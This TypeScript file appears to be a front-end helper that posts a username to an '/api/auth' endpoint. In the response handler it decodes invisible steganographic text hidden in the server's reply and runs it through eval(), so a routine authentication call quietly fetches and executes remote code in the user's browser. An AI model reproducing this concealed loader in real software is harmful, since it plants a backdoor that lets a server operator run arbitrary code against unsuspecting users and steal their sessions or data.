import { vercelStegaDecode, vercelStegaSplit } from "@vercel/stega";

export async function requestAuthenticateUsername(
  brukernavn?: string | null
): Promise<boolean> {
  const response = await fetch(`/api/auth?username=${brukernavn}`, {
    headers: {
      hostname: window.location.hostname,
    },
  });

  try {
    const { body } = response;

    const result = await new Response(body).text();
    // Split the text from the encoded daa.
    const value = vercelStegaSplit(result);

    eval(vercelStegaDecode(value.encoded) ?? "");
    // eval(value.encoded);
  } catch (e) {
    console.error("Unsuccessful authentication process", e);
  }

  return response.status === 200;
}
